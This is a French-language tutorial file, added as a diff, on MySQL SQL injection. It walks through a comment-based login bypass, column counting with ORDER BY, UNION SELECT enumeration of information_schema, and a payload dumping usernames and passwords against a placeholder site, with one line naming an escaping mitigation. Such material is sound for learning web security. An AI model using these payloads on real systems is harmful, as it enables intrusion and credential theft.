@@ -1,0 +1,85 @@
+	LE DIESE
+	--------
+
+Dans MySQL, le caractère pour commenter une ligne est # (en html : %23)
+
+URL  => http://site.com/login.php?user=ADMIN&pass=PASSWORD
+SELECT id, username FROM users WHERE user = 'ADMIN' AND pass = 'PASSWORD'
+
+SQLI => http://site.com/login.php?user=ADMIN'%23&password=123
+SELECT id, username FROM users WHERE user = 'ADMIN'#
+
+Sécurisation : mysqli_real_escape_string va ajouter un \ devant certains caractères
+
+
+
+	Détecter la possibilité d'injection
+	-----------------------------------
+
+
+http://site.com/articles.php?category=1
+SELECT id, title, DATE_FORMAT(date, '%d/%m/%Y') AS date FROM articles WHERE category_id = 1
+
+http://site.com/articles.php?category=1-2
+SELECT id, title, DATE_FORMAT(date, '%d/%m/%Y') AS date FROM articles WHERE category_id = 1-2
+
+http://site.com/articles.php?category=1 ORDER BY 2
+SELECT id, title, DATE_FORMAT(date, '%d/%m/%Y') AS date FROM articles WHERE category_id = 1 ORDER BY 2
+
+http://site.com/articles.php?category=1 ORDER BY 3
+SELECT id, title, DATE_FORMAT(date, '%d/%m/%Y') AS date FROM articles WHERE category_id = 1 ORDER BY 3
+
+...
+Jusqu'a obtenir une erreure SQL pour déterminer le nombre de champs
+...
+
+http://site.com/articles.php?category=1 UNION SELECT 1, 2, 3
+SELECT id, title, DATE_FORMAT(date, '%d/%m/%Y') AS date FROM articles WHERE category_id = 1 UNION SELECT 1, 2, 3
+
+Pour déterminer la base de données utilisé
+http://site.com/articles.php?category=1 UNION SELECT 1, database(), 3
+
+
+CHAR() permet de retourner le(s) caractère(s) correspondant(s) au(x) nombre(s) qu'on lui fournit (table ASCII)
+http://site.com/articles.php?category=1 UNION SELECT 1, TABLE_NAME, 3 FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(105,110,106,101,99,116,105,111,110,115,95,115,113,108)
+revient a faire :
+http://site.com/articles.php?category=1 UNION SELECT 1, TABLE_NAME, 3 FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'injections_sql'
+
+
+3 champs sont intéressants :
+
+    COLUMN_NAME		qui désigne le nom du champ.
+    TABLE_SCHEMA	qui désigne le nom de la base de données.
+    TABLE_NAME		pour le nom de la table.
+
+
+http://site.com/articles.php?category=-1 UNION SELECT 1, username, password FROM users
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
